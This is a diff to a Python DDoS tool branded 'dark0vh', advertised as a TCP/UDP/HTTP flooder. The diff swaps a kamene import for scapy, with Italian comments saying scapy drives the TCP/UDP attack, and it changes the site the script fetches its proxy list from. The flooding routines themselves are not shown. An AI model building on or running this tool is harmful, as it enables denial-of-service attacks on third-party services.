@@ -6,22 +6,15 @@ import re
 import urllib.request
 import os
 import sys
-
 from bs4 import BeautifulSoup
 
-import logging
-logging.getLogger("kamene.runtime").setLevel(logging.ERROR) # C0d3d by dark0vh
 
-if sys.platform.startswith("linux"): # C0d3d by dark0vh
-	from kamene.all import * # C0d3d by dark0vh
-elif sys.platform.startswith("freebsd"): # C0d3d by dark0vh
-	from kamene.all import * # C0d3d by dark0vh
-else: # C0d3d by dark0vh
-	
-	print ( " TCP / UDP / HTTP FLOOD.") # printa questo
+try: # se si è sotto linux scapy (per l'attacco tcp-udp) funziona
+	from scapy.all import * # importa scapy
+except: # altrimenti, se fallisce l'importazione
+	print ("TCP/UDP FLOOD ARE NOT SUPPORTED UNDER THIS SYSTEM. YOU MUST USE HTTP FLOOD.") # printa questo
 
 print('''
-            TCP / UDP / HTTP FLOOD.
 	    
    DDDDDDDD     AAAAAAA    RRRRRRRR    KK    KK   000000000   VV        VV   HH     HH
    DD     DD   AA     AA   RR    RR    KK  KK     00     00    VV      VV    HH     HH
@@ -570,7 +563,7 @@ def choiceproxysocks():
 def choicedownproxy():
 	choice4 = input("Do you want to download a new list of proxy? Answer 'y' to do it: ")
 	if choice4 == "y":
-		urlproxy = "https://www.sslproxies.org/"
+		urlproxy = "http://free-proxy-list.net/"
 		proxyget(urlproxy)
 	else:
 		proxylist()
